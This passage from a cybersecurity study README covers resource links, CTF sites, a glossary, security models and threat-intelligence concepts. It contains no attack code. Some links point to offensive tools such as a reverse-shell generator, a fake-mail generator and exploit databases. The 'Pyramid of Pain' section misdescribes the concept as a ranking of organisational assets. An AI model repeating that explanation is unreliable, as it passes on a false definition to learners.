<h2 align="center">Remember to take a look at the <code>/More</code> folder! ;)</h2>

<br>

<div align="center">
	
![Hits](https://hits.sh/github.com/Berkanktk/CyberSecurity.svg?label=Visitors)
![GitHub Stars](https://img.shields.io/github/stars/Berkanktk/CyberSecurity)
![GitHub Forks](https://img.shields.io/github/forks/Berkanktk/CyberSecurity)
![GitHub Watchers](https://img.shields.io/github/watchers/Berkanktk/CyberSecurity)
![Last Commit](https://img.shields.io/github/last-commit/Berkanktk/CyberSecurity)
![Repo Size](https://img.shields.io/github/repo-size/Berkanktk/CyberSecurity)

</div>

<p align="center">
Thank you for exploring this project! I hope you will find the content valuable and perhaps even worth sharing with others. This project represents years of dedication, learning, and refinement, fueled by countless hours and cups of coffee ☕. If you’d like to support its continued growth, your contribution would be highly appreciated.
</p>

<br>

<!--
<p align="center">
  <a href="https://www.buymeacoffee.com/berkanktk" target="_blank">
    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" height="50px">
  </a>
</p>
-->

# List of Contents
1. [Links](#links)
2. [CTF Sites](#ctf-sites)
3. [Books](#books)
4. [Services](#services)
5. [Terms](#terms)
6. [Principles and Standards](#principles-and-standards)
   1. [Security Models](#security-models)
      1. [CIA Triad](#cia-triad)
      2. [DAD Triad](#dad-triad)
      3. [The Bell-La Padula Model](#the-bell-la-padula-model)
      4. [Biba Model](#biba-model)
      5. [Clark-Wilson Model](#clark-wilson-model)
   2. [Trust and Access Control](#trust-and-access-control)
      1. [Principles of Privileges](#principles-of-privileges)
      2. [Zero Trust versus Trust but Verify](#zero-trust-versus-trust-but-verify)
   3. [Threat Identification and Management](#threat-identification-and-management)
      1. [Threat Modeling and Incident Response](#threat-modeling-and-incident-response)
      2. [Vulnerability vs Threat vs Risk](#vulnerability-vs-threat-vs-risk)
      3. [Threat intelligence Classifications](#threat-intelligence-classifications)
      4. [Threat Intelligence Tools](#threat-intelligence-tools)
      5. [The Pyramid of Pain](#the-pyramid-of-pain)
   4. [Ethical and Legal Aspects](#ethical-and-legal-aspects)
   5. [Security Assessment Frameworks and Methodologies](#security-assessment-frameworks-and-methodologies)
      1. [Black, Grey, & White Box Testing](#black-grey--white-box-testing)
      2. [OSSTMM](#osstmm)
      3. [OWASP](#owasp)
      4. [NIST](#nist-cybersecurity-framework-11)
      5. [NCSC CAF](#ncsc-caf)
      6. [MITRE ATT&CK](#mitre-attck)
      7. [Unified Kill chain](#unified-kill-chain)
   6. [Global Security Standards](#global-security-standards)
      1. [ISO/IEC 19249](#isoiec-19249)
      2. [ISO27001](#iso27001)
   7. [Operational Roles and Career Development](#operational-roles-and-career-development)
7. [Linux Commands](#linux-commands)
8. [Tools (CLI)](#tools-cli)
    1.  [Aircrack-ng](#aircrack-ng)
    2.  [Gobuster](#gobuster)
    3.  [Feroxbuster](#feroxbuster)
    4.  [Hashcat](#hashcat)
    5.  [Hydra](#hydra)
    6.  [John The Ripper](#john-the-ripper)
    7.  [Metasploit](#metasploit)
    8.  [Netcat](#netcat)
    9.  [Nikto](#nikto-2)
    10. [Nmap](#nmap)
    11. [SQLMap](#sqlmap)
9.  [Tools (GUI)](#tools-gui)
    1.  [Autopsy](#autopsy)
    2.  [Burp Suite](#burp)
    3.  [Nessus](#nessus)
    4.  [Wireshark](#wireshark)
10. [Text Editors](#text-editors)
    1.  [Nano](#nano)
    2.  [VIM](#vim)
11. [Networking](#networking) 
    1.  [Internet Protocol (IP)](#internet-protocol-ip)
    2.  [The Router](#the-router)
    3.  [IPv4 Classes](#ipv4-classes)
    4.  [Subnetting](#subnetting)
    5.  [Address Resolution Protocol (ARP)](#address-resolution-protocol-arp)
12. [Web Exploitation](#web-exploitation)
    1.  [Content Discovery](#content-discovery)
    2.  [SQL Injection](#sql-injection)
    3.  [Command Injection](#command-injection)
    4.  [Directory Traversal](#directory-traversal)
    5.  [Authentication Bypass](#authentication-bypass)
    6.  [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference)
    7.  [File Inclusion (LFI/RFI)](#file-inclusion-lfirfi)
    8.  [Cross Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
    9.  [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
    10. [Server Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
    11. [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
    12. [Server Side Includes (SSI)](#server-side-includes-ssi)
13. [Digital Forensics](#digital-forensics)
    1.  [File Analysis](#file-analysis)
    2.  [PCAP Analysis](#pcap-analysis)
    3.  [Steganography](#steganography)
    4.  [Memory Analysis](#memory-analysis)
    5.  [Disk Imaging](#disk-imaging)
14. [Binary Exploitation](#binary-exploitation)
    1.  [Registers](#registers)
    2.  [The Stack](#the-stack)
    3.  [Calling Conventions](#calling-conventions)
    4.  [Global Offset Table (GOT)](#global-offset-table-got)
    5.  [Buffers and Buffer Overflows](#buffers)
    6.  [Return Oriented Programming (ROP)](#return-oriented-programming-rop)
    7.  [Binary Security](#binary-security)
    8.  [The Heap and Exploitation](#the-heap)
    9.  [Format String Vulnerability](#format-string-vulnerability)
    10. [Integer Overflow](#integer-overflow)
    11. [ASLR Bypass](#aslr-bypass)
15. [Reverse Engineering](#reverse-engineering)
    1.  [Assembly Language](#assembly-language)
    2.  [Disassemblers & Debuggers](#disassemblers--debuggers)
    3.  [Decompilers](#decompilers)
16. [Cryptography](#cryptography)
    1.  [Genating Keys](#generating-keys)
    2.  [Cryptographic Methods](#cryptographic-methods)
    3.  [Encoding](#encoding)
    4.  [Hashing](#hashing)
    5.  [Ciphers](#ciphers)
    6.  [Encryption (RSA)](#encryption-rsa)
17. [Windows Exploitation](#windows-exploitation)
    1.  [Active Directory](#active-directory) 
    2.  [Windows Reverse Shells](#windows-reverse-shells)
    3.  [Samba (SMB)](#samba-smb)
18. [Shells and Privilege Escalation](#shells-and-privilege-escalation)
    1.  [TTY Shell](#tty-shell)
    2.  [Privilege Escalation](#privilege-escalation)
19. [Vulnerabilities & Threats](#vulnerabilities--threats)
    1.  [Social Engineering](#social-engineering)
    2.  [Denial of Service (DoS)](#denial-of-service-dos--ddos)
    3.  [Misconfigurations](#misconfigurations)
20. [Miscellaneous](#miscellaneous)

# Links
[Abuse.ch](https://abuse.ch) - a collection of malware and threat intelligence feeds.  
[Ahmia](https://ahmia.fi/) - search engine for hidden services on the Tor network   
[AI Generated Photos](https://generated.photos) - 100.000 AI generated faces.   
[Aperisolve](https://aperisolve.com/) - all in one steganography analysis  
[Archive.org](https://archive.org/web/) - internet Archieve    
[ASCII Converter](https://www.branah.com/ascii-converter) - Hex, decimal, binary, base64, and ASCII converter  
[Assembly Tutorials](https://www.tutorialspoint.com/assembly_programming/index.htm) - assembly tutorials  
[Base64 Decodr/Encoder](https://appdevtools.com/base64-encoder-decoder) - base64 decoder/encoder  
[Bcrypt Generator](https://bcrypt-generator.com) - a simple bcrypt generator  
[Bug Bounty](https://hackerone.com/bug-bounty-programs) - a list of bug bounty programs  
[Can I use](https://caniuse.com) - provides up-to-date browser support tables for support of front-end web technologies.      
[Censys](https://search.censys.io/) - search engine for internet connected devices  
[Cheatography](https://www.cheatography.com/) - over 3,000 free cheat sheets, revision aids and quick references.    
[CodeBeautify](https://codebeautify.org) - code Beautifier, Viewer and converter    
[Common ports](https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-ports.html) - a lists of the most common ports   
[Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier) - cipher identifier    
[Convert Binary](https://www.convertbinary.com) - a wide range of different converters for binary numbers      
[Convertcsv](https://www.convertcsv.com/sql-to-csv.htm) - convert SQL to CSV     
[Crackstation (Rainbow tables)](https://crackstation.net) - hash cracker      
[CSS Reference](https://cssreference.io) - CSS reference    
[CVECrowd](https://cvecrowd.com) - a platform for sharing and discussing cybersecurity vulnerabilities.  
[CVE Details](https://www.cvedetails.com/) - CVE security vulnerability advanced database.      
[CVE Mitre](https://cve.mitre.org) - list of publicly known cybersecurity vulnerabilities.  
[CVS](https://www.first.org/cvss/calculator/3.1) - Scoring System Calculator     
[CyberChef](https://gchq.github.io/CyberChef/) - a web app for encryption, encoding, compression and data analysis.     
[Cybercrime Tracker](https://cybercrime-tracker.net) - monitors and tracks various malware families that are used to perpetrate cyber crimes.  
[crt.sh](https://crt.sh) - Certificate Transparency Log Search Engine for subdomain enumeration.  
[CTF 101](https://ctf101.org) - learn the different CTF topics in cybersecurity  
[CTF Cryptography](https://charcharbinks.com/post/ctf_crypto_for_beginners/) - ctf cryptography for beginners  
[dCode](https://www.dcode.fr/en) - dcode.fr has many decoders for a lot of ciphers  
[dehashed](https://www.dehashed.com/) - is a hacked database search engine.     
[Diff Checker](https://www.diffchecker.com/image-compare/) - compare images  
[DNSDumpster](https://dnsdumpster.com) - free domain research tool that can discover hosts related to a domain   
[DogBolt](https://dogbolt.org/) - decompiler explorer  
[EmailHippo](https://emailhippo.com) - a free email verification tool.     
[Emkei] (https://emkei.cz) - fake mail generator  
[Explain Shell](https://explainshell.com) - a tool to help you understand shell commands.  
[ExploitDB](https://www.exploit-db.com) - searchable archive from The Exploit Database.      
[fakenamegenerator](https://www.fakenamegenerator.com) - your randomly generated identity.     
[Feodo Tracker](https://feodotracker.abuse.ch) - a project by abuse.ch tracking the C2 infrastructure of the Feodo Tracker Botnet.  
[File Signature](https://www.garykessler.net/library/file_sigs.html) -  a table of file signatures (aka "magic numbers")  
[File Signature Wiki](https://en.wikipedia.org/wiki/List_of_file_signatures) - another list of file signatures (aka "magic numbers")  
[Forensically](https://29a.ch/photo-forensics/#forensic-magnifier) - a tool to analyze images.  
[Godbolt](https://godbolt.org) - compiler explorer   
[Google advanced search](https://www.google.dk/advanced_search) - google dorking made easy      
[Google Hacking Database](https://www.exploit-db.com/google-hacking-database) - juicy information found by dorking      
[GTFOBins](https://gtfobins.github.io) - list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.    
[HackerOne](https://www.hackerone.com) -  HackerOne is a vulnerability coordination and bug bounty platform.  
[Hacking Glossary](https://resources.hackthebox.com/hacking-glossary) - a glossary of hacking terms made by HackTheBox.  
[Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) - tool to identify hash types  
[Hash Identifier](https://gchq.github.io/CyberChef/#recipe=Analyse_hash()https://hashes.com/en/tools/hash_identifiers) - hash identifier using CyberChef    
[have i been pwned?](https://haveibeenpwned.com) - check if you have an account that has been compromised in a data breach.        
[HexEd](https://hexed.it) - HexEd is a powerful online hex editor running in your web browser  
[hilite.me](http://hilite.me) - converts your code snippets into pretty-printed HTML formats    
[HSV to RGB](https://www.rapidtables.com/convert/color/hsv-to-rgb.html) - HSV to RGB color converter     
[HTML Reference](https://htmlreference.io) - HTML reference    
[HTTrack](https://www.httrack.com) - website copier      
[Hunter.io](https://hunter.io) - find email addresses in seconds.  
[Image Color Picker](https://imagecolorpicker.com) - select a color and get the HTML Color Code of this pixel   
[Intelix](https://intelx.io) - Search Tor, I2P, data leaks and the public web by email, domain, IP, CIDR, Bitcoin address and more.    
[JoomScan](https://github.com/OWASP/joomscan) -  Joomla Vulnerability Scanner  
[k8s-security](https://github.com/kabachook/k8s-security) - kubernetes security notes and best practices.      
[Kali Linux Tutorials](https://www.tutorialspoint.com/kali_linux/index.htm) - Kali Linux Tutorials  
[Keybase](https://keybase.io/) - it's open source and powered by public-key cryptography.    
[LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) - learn about local file inclusion   
[Linux Commands](https://www.mediacollege.com/linux/command/linux-command.html) - a list of linux commands       
[malc0de](http://malc0de.com/database) - malware search engine.    
[Malware Bazaar](https://bazaar.abuse.ch) - malware search engine.  
[MD5 Online](https://www.md5online.org/md5-decrypt.html) - md5Online offers several tools related to the MD5 cryptographic algorithm.     
[Morse Code Translator](https://morsecode.world/international/translator.html) a morse code translator   
[Morse Code Adaptive Audio Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) - a morse code adaptive audio decoder  
[Morse Code Audio Decoder](https://morsecode.world/international/decoder/audio-decoder-expert.html) - a morse code audio decoder    
[Morse Code Sound & Vibration Listener](https://databorder.com/transfer/morse-sound-receiver/) - a morse code sound & vibration listener  
[Namechk](https://namechk.com) - check if your desired username is available on over 500 social networks (username OSINT).  
[NerdyData](https://www.nerdydata.com) - the search engine for source code  
[ntlm.pw](https://ntlm.pw) - NTLM password cracker  
[Observatory by Mozilla](https://observatory.mozilla.org)- set of tools to analyze your website.    
[Office Recovery](https://online.officerecovery.com/pixrecovery/) - repair corrupt JPEG, PNG, GIF, BMP, TIFF, and RAW images.  
[PDF24](https://tools.pdf24.org/) - free and easy to use online PDF tools    
[Phishtool](https://www.phishtool.com) - PhishTool is a free phishing simulation tool.  
[NPiet](https://www.bertnase.de/npiet/npiet-execute.php) - Piet is an esoteric programming language based of using colored pixels to represent commands.  
[Ping.eu](https://ping.eu/) - online Ping, Traceroute, DNS lookup, WHOIS and others.      
[pipl](https://pipl.com/) - is the place to find the person behind the email address, social username or phone number.  
[Pixrecovery](https://online.officerecovery.com/pixrecovery/) - repair corrupt JPEG, PNG, GIF, BMP, TIFF, and RAW images.  
[Rapid7](https://www.rapid7.com/db/) - vulnerability and exploit database.  
[Regex101](https://regex101.com) - online regex tester and debugger: PHP, PCRE, Python, Golang and JavaScript.    
[RegEx Pal](https://www.regexpal.com/) - online regex testing tool + other tools.      
[RegExr](https://regexr.com/) - online tool to learn, build, & test Regular Expressions (RegEx / RegExp).      
[Revshell](https://www.revshells.com) - reverse shell generator.  
[RequestBin](https://requestbin.com) - RequestBin gives you a URL that collects requests  so you can inspect them in a human-friendly way   
[RGBA Color Picker](https://rgbacolorpicker.com) - an RGBA color picker    
[ShellCheck](https://www.shellcheck.net) - finds bugs in your shell scripts.     
[Shodan](https://www.shodan.io) - learn various pieces of information about the client’s network, without actively connecting to it.  
[sploitus](https://sploitus.com) - the exploit and tools database.  
[SRI Hash Generator](https://www.srihash.org) - Subresource Integrity (SRI) Hash Generator  
[SSL Scanner](http://www.ssltools.com) - analyze website security.    
[SSL Scan](https://github.com/rbsec/sslscan) - sslscan tests SSL/TLS enabled services to discover supported cipher suites  
[Steganographic Decoder](https://futureboy.us/stegano/decinput.html) - decodes the payload that was hidden in a JPEG image or a WAV or AU audio file     
[Stego Tricks](https://book.hacktricks.xyz/crypto-and-stego/stego-tricks) - learn stego tricks  
[Subnet Calculator](https://www.calculator.net/ip-subnet-calculator.html) - IPv4 to IPv6 subnet calculator     
[Subnet Cheatsheet](https://www.freecodecamp.org/news/subnet-cheat-sheet-24-subnet-mask-30-26-27-29-and-other-ip-address-cidr-network-references/) - subnet cheatsheet  
[SSL Blacklist](https://sslbl.abuse.ch) - a free SSL blacklist that can be used to detect malicious SSL certificates.  
[Tabulate](https://pypi.org/project/tabulate/) - create clean looking tables  
[Talos Intelligence](https://talosintelligence.com) - threat intelligence from Cisco.  
[Threat Fox](https://threatfox.abuse.ch) - a resource for sharing indicators of compromise (IOCs).  
[TIO](https://tio.run/#) - TIO is a free online interpreter, compiler and REPL.  
[URL Haus](https://urlhaus.abuse.ch) - a project by abuse.ch to collect and classify malicious URLs.  
[urlscan.io](https://urlscan.io) - service to scan and analyse websites.      
[urlvoid ](https://www.urlvoid.com) - this service helps you detect potentially malicious websites.   
[User-Agent Switcher](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/) switch and manage user agents     
[Vega](https://subgraph.com/vega/) - web security scanner and web security testing platform  
[ViewDNS](http://viewdns.info) - one source for free DNS related tools and information.      
[VirusTotal](https://www.virustotal.com/gui/home/upload) - analyze suspicious files and URLs to detect types of malware.     
[Visual Subnet Calculator](https://www.davidc.net/sites/default/subnets/subnets.html) - a visual subnet calculator  
[WebToolHub-LE](https://www.webtoolhub.com/tn561364-link-extractor.aspx) - HTML hyperlink extractor      
[WebToolHub](https://www.webtoolhub.com) - lots of different web tools  
[WhatsMyName](https://whatsmyname.app) - social media username enumeration     
[WHOIS lookup](https://whois.domaintools.com) - best whois lookup    
[Wigle](https://wigle.net) - is a website for collecting information about the different wireless hotspots around the world      
[WPScan](https://wpscan.com/) - WordPress security scanner  

# CTF Sites
[TryHackMe](https://tryhackme.com) - TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs.  
[HackTheBox](https://www.hackthebox.com/) - HackTheBox is a massive, online cybersecurity practical training platform.  
[CTFLearn](https://ctflearn.com) - An online platform built to help ethical hackers learn, practice, and compete.   
[Challenges](https://challenges.re) - Reverse engineering CTF training platform     
[Cryptohack](https://cryptohack.org) - Cryptography learning platform.  
[Root Me](https://www.root-me.org) - Root Me is a platform for everyone to test and improve knowledge in computer security and hacking.  
[ROP Emperium](https://ropemporium.com) - ROP Emporium is a series of challenges based around Return Oriented Programming (ROP).  
[pico CTF](https://picoctf.org/) - picoCTF is a free computer security game targeted at middle and high school students.  

# Books
- Penetration Testing
- Linux Basics for Hackers
- The Linux Command Line and Shell Scripting Bible
- Black Hat Python
- The Hacker PlayBook 2 & 3
- Hacker Methodology Handbook
- Gray Hat Hacking
- Red Team Field Manual
- Metasploit
- The Web Application Hacker’s Handbook
- Real-World Bug Hunting
- Attacking Network Protocols


# Services
## Network security
An Intrusion Detection and Prevention System (IDPS) or simply Intrusion Prevention System (IPS) is a system that can detect and prevent network intrusions. IDS setups can be divided based on their location in the network into:

**Host-based IDS (HIDS)**: Installed on an OS to monitor inbound/outbound host traffic and running processes.

**Network-based IDS (NIDS)**: A dedicated device or server monitoring network traffic via a switch’s monitor port to detect malicious activity across the network or VLANs.

## VPN Providers
A Virtual Private Network (VPN) encrypts your internet connection to protect your privacy and security.

Some of these providers are:
* [IVPN](https://www.ivpn.net/)
* [Mullvad](https://mullvad.net/en/)
* [ProtonVPN](https://protonvpn.com/)

## VPS Providers
A Virtual Private Server (VPS) is an isolated environment created on a physical server using virtualization technology.

Some of these providers are:  
* [Vultr](https://www.vultr.com/products/cloud-compute/)	 
* [Linode](https://www.linode.com/pricing/)
* [DigitalOcean](https://www.digitalocean.com/pricing)	
* [OneHostCloud](https://onehostcloud.hosting)

# Terms
| Term                                 | Description                                                                                                                                 |
|--------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------|
| Active reconnaissance                | Directly interacting with the system.                                                                                                        |
| Asymmetric encryption                | Uses different keys to encrypt and decrypt.                                                                                                 |
| APT                                  | Advanced Persistent Threat (team/group or even nation-state).                                                                                |
| Authentication                       | Proving that the user is whom they claim to be.                                                                                              |
| Broken Access Control                | Example: We cannot let anyone view the webmail before logging in or modify someone else's account.                                            |
| Brute force                          | Attacking cryptography by trying every possible password or key.                                                                             |
| Cipher                               | A method of encrypting or decrypting data. Modern ciphers are cryptographic, but there are non-cryptographic ones like Caesar cipher.         |
| Ciphertext                           | The result of encrypting plaintext; encrypted data.                                                                                          |
| Credential Stuffing                  | Attack where compromised credentials are used to gain unauthorized access to an account.                                                      |
| Cryptanalysis                        | Attacking cryptography by finding a weakness in the underlying mathematics.                                                                  |
| Defacing                             | Modifying a website to display a message or image.                                                                                           |
| Defensive security                   | Protecting a network and systems by analyzing and securing against digital threats.                                                           |
| Defence-in-Depth                     | A security strategy involving multiple levels, also known as Multi-Level Security.                                                            |
| Dynamic SSH Tunneling                | Dynamic port forwarding turns your SSH client into a SOCKS proxy server.                                                                     |
| Encoding                             | A form of data representation (e.g., base64), not encryption, and immediately reversible.                                                     |
| Encryption                           | Transforming data into ciphertext using a cipher.                                                                                            |
| Firewall appliance                   | A firewall restricts connections based on predefined rules, controlling what can enter or leave a network.                                    |
| Hash collision                       | When two different inputs generate the same hash output.                                                                                      |
| IDOR                                 | Insecure Direct Object Reference, a type of access control vulnerability.                                                                    |
| IP Spoofing                          | Creating IP packets with a modified source address to hide the sender's identity or impersonate another system.                               |
| IPP                                  | Internet Printing Protocol.                                                                                                                  |
| IaaS                                 | Infrastructure-as-a-Service.                                                                                                                 |
| Identification and Authentication Failure | Allowing brute force attacks or storing passwords in plain text.                                                                             |
| Identification                       | The ability to uniquely identify a user.                                                                                                     |
| Intrusion Detection System (IDS)     | Detects system and network intrusions and attempts.                                                                                           |
| Intrusion Prevention System (IPS)    | Blocks detected intrusions and attempts to prevent network breaches.                                                                          |
| Key                                  | Information needed to decrypt ciphertext and retrieve plaintext.                                                                             |
| Offensive security                   | Breaking into systems, exploiting software bugs, and finding loopholes to gain unauthorized access.                                            |
| Packet sniffing                      | Capturing data packets on a network.                                                                                                         |
| Passive reconnaissance               | Relying on publicly available information for gathering intelligence.                                                                         |
| Passphrase                           | A password-like string used to protect a key.                                                                                                |
| Password Spraying                    | Brute force attack using a list of usernames and a single password to gain system access.                                                     |
| Penetration Tester                   | A professional who tests systems to find exploitable vulnerabilities.                                                                         |
| Plaintext                            | Unencrypted data, often text but could be any file like a photograph.                                                                         |
| Proxy                                | A server acting as a gateway between an application and the internet.                                                                         |
| Private Blog Network (PBN)           | A network of websites used to build links to improve search engine rankings.                                                                  |
| Port Forwarding                      | Technique allowing external devices to access services on private networks.                                                                   |
| RCE                                  | Remote Code Execution vulnerability allowing commands to be executed on a target system.                                                      |
| Rainbow tables                       | Lookup tables of hashes to corresponding plaintexts used in password cracking.                                                                |
| Red Teamer                           | Plays the role of an adversary, simulating attacks on an organization.                                                                        |
| Reverse SSH Connection               | A remote system initiates a connection to your local system.                                                                                  |
| SAM                                  | Security Account Manager, a Windows database storing user accounts and security descriptors.                                                  |
| SSH Tunneling                        | Transporting arbitrary data over an encrypted SSH connection.                                                                                 |
| SSL/TLS                              | Cryptographic protocols for secure data transmission; SSL is outdated, TLS is the modern version.                                              |
| Security Engineer                    | Designs, monitors, and maintains security controls to prevent cyberattacks.                                                                   |
| Symmetric encryption                 | Uses the same key to encrypt and decrypt.                                                                                                     |
| VPS                                  | Virtual Private Server, a type of IaaS.                                                                                                       |
| VPN concentrator appliance           | A VPN ensures network traffic confidentiality and integrity by preventing third-party access and modification.                                |
| XSS                                  | Cross-Site Scripting, a vulnerability in web applications that can be used to execute malicious scripts.                                       |


## Forms of Malware/Attacks
There are several types of malware and attacks that can compromise systems and data. Here are some common ones.

| Term                | Description                                                                                                                                 |
|---------------------|---------------------------------------------------------------------------------------------------------------------------------------------|
| Virus               | Malware that infects a computer by inserting itself into programs, potentially causing data and program damage. Needs user interaction to spread. |
| Worm                | Malware that replicates itself and spreads without user interaction, often through networks, email, or other means.                           |
| Trojan horse        | Malware disguised as a legitimate program that performs harmful actions once inside a system.                                                |
| Spyware             | Malware that secretly collects information about a user's activities and reports it back to the attacker.                                    |
| Phishing            | A technique to steal sensitive information by posing as a legitimate organization or individual.                                             |
| DoS attack          | Overloading a system with traffic to disrupt its services.                                                                                   |
| DDoS attack & botnets| A distributed denial-of-service attack using a network of compromised devices to overload a target with traffic.                             |
| Spam                | Unwanted email that can overwhelm recipients and may spread malware or phishing attempts.                                                    |
| Ransomware          | Malware that encrypts data and demands payment for decryption.                                                                               |
| Rootkit             | Malware that grants an attacker root access and conceals its presence from the user.                                                         |
| Adware              | Malware that displays unwanted advertisements on a computer.                                                                                 |

# Principles and Standards

## Security Models
### CIA Triad
CIA Triad is a model designed to guide policies for information security within an organisation. It consists of three core principles being: Confidentiality, Integrity, and Availability.

- **Confidentiality** ensures that only the intended persons or recipients can access the data.
- **Integrity** aims to ensure that the data cannot be altered; moreover, we can detect any alteration if it occurs.
- **Availability** aims to ensure that the system or service is available when needed.

### DAD Triad
The security of a system is attacked through one of several means. It can be via the disclosure of secret data, alteration of data, or destruction of data. It is the opposite of the CIA triad.

- **Disclosure**: Unauthorized access to information. Is the opposite of confidentiality.
- **Alteration**: Unauthorized changes to information. Is the opposite of Integrity
- **Destruction**: Unauthorized or intentional destruction of information. Is the opposite of Availability

Protecting against disclosure, alteration, and destruction/denial is very important, as this protection is equivalent to working to maintain confidentiality, integrity and availability.

### The Bell-La Padula Model
The Bell-LaPadula Model aims to achieve **confidentiality** by specifying three rules:

1. **Simple Security Property**: This property is referred to as “no read up”; it states that a subject at a lower security level cannot read an object at a higher security level. This rule prevents access to sensitive information above the authorized level.
2. **Star Security Property**: This property is referred to as “no write down”; it states that a subject at a higher security level cannot write to an object at a lower security level. This rule prevents the disclosure of sensitive information to a subject of lower security level.
3. **Discretionary-Security Property**: This property uses an access matrix to allow read and write operations. An example access matrix is shown in the table below and used in conjunction with the first two properties.

The first two properties can be summarized as “write up, read down.” You can share confidential information with people of higher security clearance (write up), and you can receive confidential information from people with lower security clearance (read down).

| Subjects | Object A | Object B |
| --- | --- | --- |
| Subject 1 | Write | No access |
| Subject 2 | Read/Write | Read |

**Limitation**: It was not designed to handle file-sharing.

### Biba Model
The Biba Model aims to **achieve integrity by** specifying two main rules

1. **Simple Integrity Property**: This property is referred to as “no read down”; a higher integrity subject should not read from a lower integrity object.
2. **Start Integrity Property**: This property is referred to as “no write up”; a lower integrity subject should not write to a higher integrity object.

**Limitation**: Does not handle internal threats (insider threat).

### Clark-Wilson Model
The Clark-Wilson Model also aims to achieve integrity by using the following concepts:

- **Constrained Data Item (CDI)**: This refers to the data type whose integrity we want to preserve.
- **Unconstrained Data Item (UDI)**: This refers to all data types beyond CDI, such as user and system input.
- **Transformation Procedures (TPs)**: These procedures are programmed operations, such as read and write, and should maintain the integrity of CDIs.
- **Integrity Verification Procedures (IVPs)**: These procedures check and ensure the validity of CDIs.

## Trust and Access Control
### Principles of Privileges
It is vital to administrate and correctly define the various levels of access to an individuals require. These levels are determined on two primary factors:
1. The individual's role/function within the organisation
2. The sensitivity of the information being stored on the system

When managing access rights, two crucial concepts are used: Privileged Identity Management (PIM) and Privileged Access Management (PAM).

- **PIM** is used to translate a user's role within an organisation into an access role on a system. 
- **PAM** is the management of the privileges a system's access role has, amongst other things.

What is essential when discussing privilege and access controls is the principle of least privilege. Simply, users should be given the minimum amount of privileges, and only those that are absolutely necessary for them to perform their duties. 

### Zero Trust versus Trust but Verify
Trust in cybersecurity is addressed through two key principles:

1. **Trust but Verify**: Verify the actions of trusted entities through automated security mechanisms like logs and intrusion detection.
2. **Zero Trust**: Assume no  trust and require authentication and authorization for all access, reducing the potential impact of breaches. Implementations like microsegmentation enhance security.

## Threat Identification and Management
### Threat Modeling and Incident Response
Threat modelling is the process of reviewing, improving, and testing the security protocols in place in an organisation's information technology infrastructure and services.

This process is very similar to a risk assessment made in workplaces for employees and customers. The principles all return to:  
```plaintext
Preparation -> Identification -> Mitigations -> Review
```

It is, however, a complex process that needs constant review and discussion with a dedicated team. An effective threat model includes:

* Threat intelligence
* Asset identification
* Mitigation capabilities
* Risk assessment

To help with this, there are frameworks such as **STRIDE** (Spoofing identity, Tampering with data, Repudiation threats, Information disclosure, Denial of Service and Elevation of privileges) and **PASTA** (Process for Attack Simulation and Threat Analysis)

### Vulnerability vs Threat vs Risk
1. **Vulnerability**: Vulnerabilities are weaknesses that can be exploited.
2. **Threat**: A threat represents the possibility of harm resulting from the exploitation of a vulnerability.
3. **Risk**: Concerned with the likelihood of a threat actor exploiting a vulnerability and the potential impact on the business. Risk assessment involves evaluating the probability and consequences of security incidents.

### Threat intelligence Classifications
Threat Intel is geared towards understanding the relationship between your operational environment and your adversary. With this in mind, we can break down threat intel into the following classifications:

- **Strategic Intel:** High-level intel that looks into the organisation's threat landscape and maps out the risk areas based on trends, patterns and emerging threats that may impact business decisions.
- **Technical Intel:** Looks into evidence and artefacts of attack used by an adversary. Incident Response teams can use this intel to create a baseline attack surface to analyse and develop defence mechanisms.
- **Tactical Intel:** Assesses adversaries' tactics, techniques, and procedures (TTPs). This intel can strengthen security controls and address vulnerabilities through real-time investigations.
- **Operational Intel:** Looks into an adversary's specific motives and intent to perform an attack. Security teams may use this intel to understand the critical assets available in the organisation (people, processes, and technologies) that may be targeted.

### Threat intelligence Tools
- Using [UrlScan.io](https://urlscan.io/) to scan for malicious URLs.
- Using [Abuse.ch](https://abuse.ch/) to track malware and botnet indicators.
- Investigate phishing emails using [PhishTool](https://www.phishtool.com/).
- Using [Cisco's Talos Intelligence platform](https://www.talosintelligence.com/) for intel gathering.

### The Pyramid of Pain
The Pyramid of Pain is a cybersecurity concept that refers to a hierarchy of assets within an organization that, if compromised, would cause the most significant harm. The pyramid's height represents the level of harm caused by a security breach, with the most critical assets at the top and less critical assets at the bottom. 

<img style="display:block; margin:0 auto;" 
src="./Images/Pyramid-of-pain.png" alt="Pyramid of pain" width="480"/>

The idea is that organizations should focus their cybersecurity efforts on the assets at the top of the pyramid to prevent the most significant damage from a security breach. The components of the Pyramid of Pain may vary depending on the organization and its specific needs, but typically include sensitive data, critical infrastructure, key personnel, and reputation.


## Ethical and Legal Aspects
### Governance & Regulation
- **Governance**: Managing and directing an organisation or system to achieve its objectives and ensure compliance with laws, regulations, and standards.
- **Regulation**: A rule or law enforced by a governing body to ensure compliance and protect against harm.
- **Compliance**: The state of adhering to laws, regulations, and standards that apply to an organisation or system.

Benefits include better security posture, stakeholder confidence, regulatory compliance, alignment with business objectives, informed decision-making, and competitive advantage.

#### **Developing Governance Documents**
Developing governance documents can involve the following steps:

1. **Identify Scope and Purpose**: Define what the document will cover and its necessity.
2. **Research and Review**: Investigate laws, regulations, and best practices to make the document comprehensive.
3. **Draft the Document**: Create an actionable, specific draft aligned with organizational goals.
4. **Review and Approval**: Involve stakeholders for feedback and final approval.
5. **Implementation and Communication**: Distribute the document and educate employees.
6. **Review and Update**: Regularly update the document for relevance and compliance.


### Information Security Frameworks
**Policies**: Formal statements that set organizational goals and how to achieve them.  
**Standards**: Specific requirements for processes, products, or services.  
**Guidelines**: Non-mandatory recommendations for achieving objectives.  
**Procedures**: Step-by-step instructions for specific tasks.  
**Baselines**: Minimum security standards that must be met.

